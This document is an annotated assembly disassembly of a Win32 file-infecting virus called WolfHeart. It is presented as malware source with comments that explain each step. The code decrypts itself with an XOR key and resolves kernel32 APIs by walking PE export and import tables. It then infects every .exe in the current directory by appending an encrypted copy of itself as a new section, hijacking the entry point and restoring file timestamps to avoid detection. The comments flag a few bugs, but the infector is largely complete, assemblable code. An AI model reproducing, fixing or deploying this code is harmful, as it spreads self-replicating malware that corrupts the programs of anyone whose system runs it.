;Win32.WolfHeart aka win32.gen disassembly by DR-EF
;--------------------------------------------------
;Author:ByteSV/VHC
;Orgin:russia
;type: encrypted win32 pe infector
;description:
;------------
;when worlfheart running,it decrypt itself using a 32bit xor key,than
;its trying to get the GetModuleHandle api address,if that fail,its
;assume win32 kernel base is at 0BFF70000h,than its start to find needed
;api functions,after that its search the currect directory for *.exe,to
;infect pe file,wolfheart append new section,put its code at that section
;and encrypt it by 32bit key using xor method,than its set the host entry
;point to that section.to read/write from files,wolfheart using file mapping






.386
.model flat
.radix 16
	extrn	ExitProcess:proc

.data

	db	?
	
.code


VirusStart:
	pushad					;save registers
	pushfd					;save flags
	call	Delta
Delta:	pop	ebp
	sub	ebp, offset Delta		;get delta offset into ebp

	VirusKey	equ	($-VirusStart+2)

	mov	eax, 00000000			;decryption key here !




	mov	esi,offset EncryptedVirusStart	;set start of data to decrypt
	add	esi, ebp
	mov	ecx, SizeOfEncryptedVirus    	 ;set size of encrypted virus
	nop
@Decrypt:
	xor	dword ptr [esi], eax		;decrypt
	inc	esi			
	inc	esi
	inc	esi
	inc	esi
	loop	@Decrypt			;decrypt virus loop
	
	
	DecryptorSize	equ	($-VirusStart)
	
	
	
EncryptedVirusStart:


	mov	ebx, 00400000			;host image base
	
HostImageBase	equ	($-4)

	mov	esi, ebx			;esi = host image base


	mov	edx,offset GMH
	add	edx, ebp
	mov	ecx, 00000010h
	nop
	mov	dword ptr [ebp+StrAdd], edx
	mov	dword ptr [ebp+StrLen], ecx
	call	WolfHeart_GetGMHApi
	jnb	GMH_Success			;jnc
	nop
	nop
	nop
	nop
	mov	eax, 0BFF70000h				;search kernel fail,assume kernel at bff700000
	jmp	FindGPA
	nop
	nop
	nop
GMH_Success:
	mov	edx, ebp
	add	edx,offset k32_dll
	push	edx					;push offset "KERNEL32.DLL"
	call	eax					;call	GetModuleHandle
	or	eax, eax				;is eax==0 ?
	je	ReturnToHost				;if so get out

;FindGPA  Function
;input:
;eax	- kernel32 image base

	

FindGPA:	
	mov	edx, dword ptr [ebp+HostImageBase]	;get host image base
	push	edx					;save it in the stack
	mov	edx, dword ptr [ebp+HostEntryPoint]	;get host entry point
	push	edx					;save it on the stack
	mov	esi, eax				;esi - kernel32 image base
	mov	esi, dword ptr [esi+3Ch]		;esi - rva to pe header
	add	esi, eax				;esi - pe header
	mov	edx, dword ptr [esi]			;read 4 bytes from start of pe header
	cmp	edx, 00004550				;compare them with PE\0\0
	jne	ReturnToHost				;if not equal get out
	xor	edx, edx				;zero edx
	mov	esi, dword ptr [esi+78]			;get rva to exports
	add	esi, eax				;convert it to va
	mov	dword ptr [ebp+Export_Section], esi		;save export section offset
	mov	ecx, dword ptr [esi+18]			;get number of functions
	mov	ebx, dword ptr [esi+20]			;get rva to function names rva's array
	add	ebx, eax				;convert it to va
FindNApi:	
	mov	edi, dword ptr [ebx]			;get rva to function name
	add	edi, eax				;convert it to va
	cmp	byte ptr [edi], 47			;compare the first byte of the api name with 'G'
	jne	NotGPA					;if not equal move to next api
	nop
	nop
	nop
	nop
	mov	esi,offset GPA				;get offset to GetProcAddress string
	add	esi, ebp				;add delta offset
	mov	ecx, 0000000Eh				;GetProcAddress size
	nop
	repz	cmpsb					;compare api name in the exports with "GetProcAddress"
	jne	NotGPA					;if not equal move to next api
	nop
	nop
	nop
	nop
	cmp	byte ptr [edi], 00			;check for string zero termination
	jne	NotGPA
	nop
	nop
	nop
	nop
	mov	dword ptr [ebp+0040166Bh], eax		;save kernel32 base address
	mov	esi, dword ptr [ebp+Export_Section]		;get offset to export section
	mov	ecx, dword ptr [esi+24]			;get rva to ordinals array
	add	ecx, eax				;convert it to va
	shl	edx, 1					;GetProcAddress position*2
	mov	edi, edx				;edi=GPA position*2
	add	edi, ecx				;edi=pointer to GPA oridinal
	xor	ebx, ebx				;zero ebx
	mov	bx, word ptr [edi]			;read GPA oridinal number
	shl	ebx, 02					;ebx=(GPA oridinal number)*4
	mov	esi, dword ptr [esi+1Ch]		;get rva to functions addresses array
	add	esi, eax				;convert it to va
	add	esi, ebx				;add it the GPA position in this array
	mov	esi, dword ptr [esi]			;read rva to GPA function
	add	eax, esi				;get its va by adding the rva to the k32 base address
	mov	ebx, dword ptr [ebp+0040166Bh]		;ebx=k32 base address
	jmp	GetApis
	nop
	nop
	nop
NotGPA:	add	ebx, 00000004				;move to next api name rva
	inc	edx					;GPA position++
	loop	FindNApi
	pop	edi					;restore stack
	jb	ReturnToHost				;return to host
GetApis:mov	esi, ebp
	add	esi,offset ApiAddresses_Table		;api addresses array
	mov	edi, ebp
	add	edi,offset ApiNamesTable		;api names array
NextApi:mov	ecx, dword ptr [edi]			;read 4 bytes from the api name
	or	ecx, ecx				;if empty==there are no more apis
	je	NoMoreApis
	nop
	nop
	nop
	nop
	push	eax					;save k32 base in the stack
	push	edi					;api name
	push	ebx					;k32 base address
	call	eax					;call GetProcAddress
	mov	dword ptr [esi], eax			;save function address
	pop	eax					;restore k32 base address
	add	edi, 00000013				;move to next api name
	nop
	nop
	nop
	add	esi, 00000004				;move to next api in the addresses table
	jmp	NextApi					;get more apis !
NoMoreApis:
	int	3
	mov	edx,offset WIN32_FIND_DATA
	add	edx, ebp
	push	edx
	sub	edx,SM_Offset				;offset to search_mask
	push	edx
	add	edx,F_FirstFile				;FindFirstFile api
	call	dword ptr [edx]				;check if return value is 0
	or	eax, eax				;<-- wrong if FindFirstFile fail it return INVALID_HANDLE_VALUE which is -1
	je	ReturnToHost				;return to host if eax==0
	mov	dword ptr [ebp+find_handle], eax
NextFile:
	mov	eax, dword ptr [ebp+0040168Fh]
	mov	dword ptr [ebp+0040165Bh], eax
	mov	eax, dword ptr [ebp+00401693]
	mov	dword ptr [ebp+0040165Fh], eax
	push	00000000
	push	00000000
	push	00000003
	push	00000000
	push	00000000
	push	0C0000000h
	mov	edx, ebp
	add	edx,offset WFD_szFileName
	push	edx
	mov	eax, dword ptr [ebp+CreateFileA_]
	call	eax
	jb	MoveToNextFile				;if error move to next file
	nop
	nop
	nop
	nop
	cmp	eax, 0FFFFFFFFh				;canot open file ?
	je	MoveToNextFile				;move to next file
	nop
	nop
	nop
	nop
	mov	dword ptr [ebp+hfile], eax		;save file handle
	call	WolfHeart_InfectFile
	mov	eax, ebp
	add	eax,offset LastWriteTime
	push	eax
	sub	eax, 00000008				;offset to LastAccessTime
	push	eax
	sub	eax, 00000008				;offset to CreationTime
	push	eax
	mov	eax, dword ptr [ebp+hfile]		
	push	eax
	mov	eax, dword ptr [ebp+SetFileTime_]
	call	eax					;call 	SetFileTime
	mov	eax, dword ptr [ebp+hfile]
	push	eax
	mov	eax, dword ptr [ebp+CloseHandle_]
	call	eax
MoveToNextFile:

	mov	edx, ebp
	add	edx,offset WIN32_FIND_DATA
	push	edx			
	mov	eax, dword ptr [ebp+find_handle]
	push	eax			
	sub	edx, FindNXTFile
	call	dword ptr [edx]				;call	findnextfile api
	or	eax, eax				;error ?
	jne	NextFile				;if not,there are more files..
	
	
	
	
	
	
	
	
	
	
	
	
	
ReturnToHost:

	pop edx
	pop eax
	mov dword ptr [ebp+HostImageBase], eax
	add edx, eax
	mov dword ptr [ebp+HostEntryPoint], edx
	popfd				
	popad
	mov edx, offset FakeHost

HostEntryPoint	equ	($-4)		
	
	push edx
	ret


;input:
;eax - file handle
WolfHeart_InfectFile:
	mov	edx, eax
	mov	eax, dword ptr [ebp+0040165Bh]
	or	eax, eax
	jne	ExitInfect
	push	00000000
	mov	eax, dword ptr [ebp+0040165Fh]
	add	eax, 00001C75h
	push	eax
	push	00000000
	push	00000004
	push	00000000
	push	edx
	mov	eax, dword ptr [ebp+CreateFileMappingA_]
	call	eax					;create file mapping object
	or	eax, eax				;error ?
	je	ExitInfect
	mov	edx, dword ptr [ebp+0040165Fh]
	add	edx, 00001C75h
	push	edx
	push	00000000
	push	00000000
	push	00000002
	push	eax
	mov	eax, dword ptr [ebp+MapViewOfFile_]	
	call	eax					;map file into memory
	or	eax, eax
	je	ExitInfect
	mov	dword ptr [ebp+mapbase], eax		;save map base !
	
	
	
	
	mov	ebx, eax				;ebx <- map base
	mov	esi, eax				;esi <- map base
	mov	esi, dword ptr [esi+3Ch]		;read rva to pe header
	add	esi, ebx				;convert it to va,ESI==PE header !
	mov	eax, dword ptr [esi]			;read 4 bytes into eax
	cmp	eax, 00004550				;compare with PE\0\0
	jne	ExitInfect_UnmapFile			;not equal get out
	mov	dword ptr [ebp+DistanceToMove], 00000000
	mov	ax, word ptr [esi+1Ah]			;get Major & Minor Linker Version(WolfHeart use them as infection sign)
	cmp	ax, 4206				;already infected ?		
	je	ExitInfect_UnmapFile			;exit
	mov	eax, dword ptr [edi+28]			;get ???(edi didnt setted)	
	mov	dword ptr [ebp+HostEntryPoint], eax	;save as entry point
	mov	eax, dword ptr [edi+24]			;get ???(edi didnt setted)
	mov	dword ptr [ebp+HostImageBase], eax	;save as image base
	mov	edi, esi				;edi = pe header
	xor	eax, eax				;set eax to zero
	mov	eax, dword ptr [esi+74]			;get Number Of Rva And Sizes
	shl	eax, 03					;eax=(Number Of Rva And Sizes)*8
	add	eax, 00000078				
	add	edi, eax				;edi - first section header
	mov	ax, word ptr [esi+06]			;ax==number of sections
	mov	cx, 0028				;cx==28h(size of section)
	mul	cx					;eax - size of all sections headers
	add	edi, eax				;edi - end of sections headers
	mov	eax, dword ptr [edi-20]			;get virtual size into eax
	cdq						;zero edx
	add	eax, dword ptr [edi-1Ch]		;add virtual address
	mov	ecx, dword ptr [esi+38]			;get section alignment
	div	ecx					
	or	edx, edx				
	je	Set_VirtualAddress		
	nop
	nop
	nop
	nop
	inc	eax								
Set_VirtualAddress:
	mul	ecx
	mov	dword ptr [ebp+SH_VirtualAddress], eax	;set SH_VirtualAddress in section header
	mov	ecx, dword ptr [esi+3Ch]		;get file alignment
	mov	eax, 00000617				;eax - virus size
	cdq						;zero edx
	div	ecx
	or	edx, edx
	je	Set_SizeOfRawData
	nop
	nop
	nop
	nop
	inc	eax
Set_SizeOfRawData:
	mul	ecx
	mov	dword ptr [ebp+SH_SizeOfRawData], eax	;set SH_SizeOfRawData in section header
	mov	eax, 00000875
	cdq						;zero edx
	div	ecx
	or	edx, edx
	je	Set_VirtualSize
	nop
	nop
	nop
	nop
	inc	eax
Set_VirtualSize:
	mul	ecx
	mov	dword ptr [ebp+SH_VirtualSize], eax	;set SH_VirtualSize
	mov	eax, dword ptr [edi-14]			;get pointer to raw data
	add	eax, dword ptr [edi-18]			;add to it size of raw data
	mov	ecx, dword ptr [esi+3Ch]		;get file alignment
	div	ecx					;eax/ecx=where to store virus
	or	edx, edx
	je	Set_PointerToRawData
	nop
	nop
	nop
	nop
	inc	eax
Set_PointerToRawData:
	mul	ecx
	mov	dword ptr [ebp+SH_PointerToRawData], eax;set SH_PointerToRawData
	push	esi					;save pe header in the stack
	mov	esi, ebp
	add	esi,offset SH_Name			;esi - start of section
	mov	ecx, 0000000Ah
	repz	movsd					;append new section
	pop	esi					;restore pe header into esi
	inc	word ptr [esi+06]			;update number of sections
	mov	ax, 4206				;ax=infection sign
	mov	word ptr [esi+1Ah], ax			;mark file as infected
	mov	eax, dword ptr [esi+34]			;get host image base
	mov	dword ptr [ebp+HostImageBase], eax	;save it
	mov	eax, dword ptr [esi+28]			;get host entry point
	mov	dword ptr [ebp+HostEntryPoint], eax	;save it
	mov	eax, dword ptr [ebp+SH_VirtualAddress]	;get virus section virtual size
	mov	dword ptr [esi+28], eax			;set new entry point to the virus section start
	mov	edi, dword ptr [ebp+SH_PointerToRawData];get pointer to raw data of the virus
	add	edi, ebx				;add map base to it
	push	edi					;save virus section raw data offset in the stack
	mov	esi, ebp
	add	esi,offset  VirusStart			;esi - virus start
	mov	ecx, 00000186				;ecx - virus size in dwords
	nop
	cld						;clear direction flag
	repz	movsd					;copy virus into the host
	pop	edi					;restore virus offset in file
	mov	esi, edi				
	add	edi, DecryptorSize
	mov	ecx, SizeOfEncryptedVirus
	nop
	mov	eax, dword ptr [ebp+00401677]
	mov	dword ptr [esi+VirusKey], eax
@Encrypt:
	xor	dword ptr [edi], eax
	inc	edi
	inc	edi
	inc	edi
	inc	edi
	loop	@Encrypt
	mov	dword ptr [ebp+DistanceToMove], 00000617

ExitInfect_UnmapFile:
	mov	eax, dword ptr [ebp+mapbase]
	push	eax
	mov	eax, dword ptr [ebp+UnmapViewOfFile_]
	call	eax
	push	00000000				;FILE_BEGIN
	push	00000000				;lpDistanceToMoveHigh
	mov	eax, dword ptr [ebp+00401693]
	add	eax, dword ptr [ebp+DistanceToMove]
	push	eax					;lDistanceToMove
	push	dword ptr [ebp+hfile]			;hFile
	mov	eax, dword ptr [ebp+SetFilePointer_]	;call	 SetFilePointer
	call	eax
	push	dword ptr [ebp+hfile]
	mov	eax, dword ptr [ebp+SetEndOfFile_]
	call	eax
ExitInfect:
	ret








;Get the GetModuleHandle from import section of the host
;input:
;esi - image base
;ebx - image base
;ecx - size of api name string
;edx - pointer to name
WolfHeart_GetGMHApi:
	cmp	word ptr [esi], 5A4Dh		;check mz sign
	jne	FindApiInImportErr		;if error exit
	mov	esi,dword ptr [esi+3Ch]		;goto pe header
	add 	esi,ebx				;add image base
	cmp 	dword ptr [esi], 00004550	;check for pe\0\0
	jne 	FindApiInImportErr		;if error exit
	mov 	ecx,dword ptr [esi+00000084h]	;get size of import section
	add 	ecx,ebx				;add it the image base
	mov	esi,dword ptr [esi+00000080h]	;get import data rva
	add	esi,ebx				;convert it to va
	mov	edi,esi				;edi = import section
NxtDll:	mov	esi, dword ptr [esi+0Ch]	;get rva to dll name
	or	esi, esi			;no more dlls ?
	je	FindApiInImportErr		;exit than
	nop
	nop
	nop
	nop
	add	esi, ebx			;convert dll name rva to va
	mov	eax, dword ptr [esi]		;get first 4 bytes of dll name into
	and	eax, 0DFDFDFDFh			;convert bytes to upper case
	cmp	eax, 4E52454Bh			;compare them with "NREK"(kernel32.dll)
	je	ScanImportsFromK32		;scan k32 IMAGE_THUNK_DATA structures
	nop
	nop
	nop
	nop
	add	edi, 00000014h			;move to next IMAGE_IMPORT_DESCRIPTOR structure
	mov	esi, edi
	cmp	edi, ecx			;is it end of import section?
	jg	NxtDll				;if no,scan for more dlls
ScanImportsFromK32:
	mov	dword ptr [ebp+image_import_desc], edi	;save k32 IMAGE_IMPORT_DESCRIPTOR
	mov	edx, dword ptr [edi+10h]	;get rva to IMAGE_IMPORT_BYNAME structure(First Thunk)
	add	edx, ebx			;convert it to va
	mov	edi, dword ptr [edi]		;get rva to IMAGE_IMPORT_BYNAME structure(Characteristics)
	add	edi, ebx			;convert it to va
NxtIBN:	mov	dword ptr [ebp+Import_By_Name], edi	;save import by name offset
	mov	eax, dword ptr [edi]		;get api name
	or	eax, eax
	je	FindApiInImportErr
	nop
	nop
	nop
	nop
	mov 	edi, dword ptr [edi]
	add 	edi, ebx
	inc 	edi
	inc 	edi
	mov 	ecx, 00000000
	
	StrLen	equ	($-4)
	
	mov 	esi, 00000000
	
	StrAdd	equ	($-4)
	
	repz	cmpsb
	je	FindApiInImport_Success
	nop
	nop
	nop
	nop
	mov 	edi, dword ptr [ebp+Import_By_Name]	;get import by name
	add 	edi, 00000004				;move to next import by name
	add 	edx, 00000004
	jmp 	NxtIBN
FindApiInImport_Success:
	mov	edi, edx
	mov	eax, dword ptr [edi]
	mov	dword ptr [ebp+0040164Fh], eax
	clc
	ret
FindApiInImportErr:
	stc
	ret
	ret

;wolfheart's data:

k32_dll 	db	"KERNEL32.DLL",0

GMH 		db	"GetModuleHandleA"

GPA 		db	"GetProcAddress"


SM_Offset	equ	(WIN32_FIND_DATA-$-3)

search_mask	db	"*.exe",0



;New section to add:

    SH_Name                   DB    ".ByteSV",0
    SH_VirtualSize            DD    0			
    SH_VirtualAddress         DD    0			
    SH_SizeOfRawData          DD    0			
    SH_PointerToRawData       DD    0			
    SH_PointerToRelocations   DD    0			
    SH_PointerToLinenumbers   DD    0			
    SH_NumberOfRelocations    DW    0			
    SH_NumberOfLinenumbers    DW    0
    SH_Characteristics        DD    600000E0h


;copyright string
db	"[Win32.Wolfheart.1481] (c) ByteSV/VHC",0



ApiNamesTable: 			

;comment:
;wolfheart align api name by 19 bytes..


	db	"FindFirstFileA"
	db	5	dup(0)		
	db	"FindNextFileA"
	db	6	dup(0)
	db	"CloseHandle"
	db	8	dup(0)
	db	"CreateFileA"
	db	8	dup(0)
	db	"WriteFile"
	db	0ah	dup(0)
	db	"ReadFile"
	db	0bh	dup(0)
	db	"CreateFileMappingA",0
	db	"MapViewOfFile"
	db	6	dup(0)
	db	"UnmapViewOfFile"
	db	4	dup(0)
	db	"SetFilePointer"
	db	5	dup(0)
	db	"SetEndOfFile"
	db	7	dup(0)
	db	"SetFileTime"
	db	0eh	dup(0)

F_FirstFile		equ	($-offset search_mask)

ApiAddresses_Table:	;(00401617)


	FindFirstFileA_		dd	0	;17
	FindNextFileA_		dd	0	;1b
	CloseHandle_		dd	0	;1f
	CreateFileA_		dd	0	;23
	WriteFile_		dd	0	;27
	ReadFile_		dd	0	;2b
	CreateFileMappingA_	dd	0	;2f
	MapViewOfFile_		dd	0	;33
	UnmapViewOfFile_	dd	0	;37
	SetFilePointer_		dd	0	;3b
	SetEndOfFile_		dd	0	;3f
	SetFileTime_		dd	0	;43
	
	






Import_By_Name	dd	0

image_import_desc	dd	0

;:0040-1647	00000000000000    BYTE 10 DUP(0)
;:0040164E 0000000000

	
find_handle	dd	0
	
	
	
	
;	00    BYTE 10 DUP(0)
	
	hfile	dd	0				
	
;:0040165b 00000000000000    BYTE 7 DUP(0)
;:00401662 00
	mapbase	dd	0



Export_Section	dd	0
;;00401-667
;:0040166C 000000


DistanceToMove		dd	0


FindNXTFile	equ	($-FindNextFileA_)



Search_Mask	equ	(WIN32_FIND_DATA-search_mask)

FILETIME                        STRUC
        FT_dwLowDateTime        DD ?
        FT_dwHighDateTime       DD ?
FILETIME                        ENDS


WIN32_FIND_DATA:
        WFD_dwFileAttributes    DD ?
        WFD_ftCreationTime      FILETIME ?
        WFD_ftLastAccessTime    FILETIME ?
        WFD_ftLastWriteTime     FILETIME ?
        WFD_nFileSizeHigh       DD ?
        WFD_nFileSizeLow        DD ?
        WFD_dwReserved0         DD ?
        WFD_dwReserved1         DD ?
        WFD_szFileName          DB 0ffh DUP (?)
        WFD_szAlternateFileName DB 13 DUP (?)
                                DB 3 DUP (?)    ; dword padding


	MAX_PATH	equ	0ffh


        CreationTime      FILETIME	?
        LastAccessTime    FILETIME	?
        LastWriteTime     FILETIME	?



SizeOfEncryptedVirus	equ	($-EncryptedVirusStart)

;   00000000    BYTE 10 DUP(0)
;:0040168A 00000000000000000000    BYTE 10 DUP(0)

	VirusEnd	equ	($-VirusStart)
FakeHost:
	push	eax
	call	ExitProcess


end	VirusStart
